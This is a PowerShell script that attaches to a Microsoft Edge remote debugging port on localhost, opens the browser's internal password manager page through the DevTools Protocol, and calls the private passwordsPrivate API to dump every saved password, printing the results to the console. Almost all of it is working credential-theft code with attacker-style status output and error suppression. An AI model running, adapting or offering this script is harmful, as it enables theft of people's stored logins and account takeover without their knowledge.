$ErrorActionPreference = 'SilentlyContinue'

# Get first page target
$targets = (curl.exe -s http://127.0.0.1:9222/json/list | ConvertFrom-Json)
$page = $targets | Where-Object { $_.type -eq 'page' } | Select-Object -First 1
$wsUrl = $page.webSocketDebuggerUrl

# Connect to the BROWSER-level WebSocket instead (for Target.createTarget)
$ver = (curl.exe -s http://127.0.0.1:9222/json/version | ConvertFrom-Json)
$browserWs = $ver.webSocketDebuggerUrl
Write-Output "[*] browser ws: $browserWs"

$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$browserWs, $ct).Wait()
Write-Output "[*] connected to browser ws"

$buf = [byte[]]::new(10485760)

function Send-Cdp {
    param([int]$Id, [string]$Method, [hashtable]$Params)
    $m = @{ id = $Id; method = $Method }
    if ($Params) { $m['params'] = $Params }
    $json = ConvertTo-Json -Compress -InputObject $m -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($json)
    $s = [ArraySegment[byte]]::new($b)
    $ws.SendAsync($s, 'Text', $true, $ct).Wait()
    $s2 = [ArraySegment[byte]]::new($buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    return [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
}

# Create a new tab for the password manager using Target.createTarget
Write-Output "[*] creating password manager tab via Target.createTarget..."
$resp = Send-Cdp 1 "Target.createTarget" @{ url = "edge://password-manager/passwords" }
Write-Output "[*] response: $($resp.Substring(0, [Math]::Min(300, $resp.Length)))"

$respObj = $resp | ConvertFrom-Json
$targetId = $respObj.result.targetId
Write-Output "[*] targetId: $targetId"

Start-Sleep 8

# Get all targets to find the new password manager page
$targets2 = (curl.exe -s http://127.0.0.1:9222/json/list | ConvertFrom-Json)
$pmTarget = $targets2 | Where-Object { $_.url -match 'password' } | Select-Object -First 1
if ($pmTarget) {
    Write-Output "[+] found PM page: $($pmTarget.url)"
    $pmWs = $pmTarget.webSocketDebuggerUrl
} else {
    Write-Output "[-] PM page not in /json/list, trying Target.getTargets..."
    $resp2 = Send-Cdp 2 "Target.getTargets"
    Write-Output "  targets: $($resp2.Substring(0, [Math]::Min(500, $resp2.Length)))"
    # Try to attach to the targetId directly
    $attachResp = Send-Cdp 3 "Target.attachToTarget" @{ targetId = $targetId; flatten = $true }
    Write-Output "  attach: $($attachResp.Substring(0, [Math]::Min(300, $attachResp.Length)))"
    $attachObj = $attachResp | ConvertFrom-Json
    $sessionId = $attachObj.result.sessionId
    Write-Output "  sessionId: $sessionId"
}

# Use the flatten session to evaluate JS in the PM page
if ($sessionId) {
    Write-Output "[*] evaluating via session $sessionId..."
    $js = 'new Promise(r => chrome.passwordsPrivate.getSavedPasswordList(l => r(JSON.stringify(l))))'
    $evalMsg = @{
        id = 10
        method = "Runtime.evaluate"
        params = @{ expression = $js; awaitPromise = $true; returnByValue = $true }
        sessionId = $sessionId
    }
    $json = ConvertTo-Json -Compress -InputObject $evalMsg -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($json)
    $s = [ArraySegment[byte]]::new($b)
    $ws.SendAsync($s, 'Text', $true, $ct).Wait()
    $s2 = [ArraySegment[byte]]::new($buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    $evalResp = [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
    Write-Output "[*] eval response: $($evalResp.Substring(0, [Math]::Min(500, $evalResp.Length)))"
}

$ws.Dispose()
Write-Output "[+] done"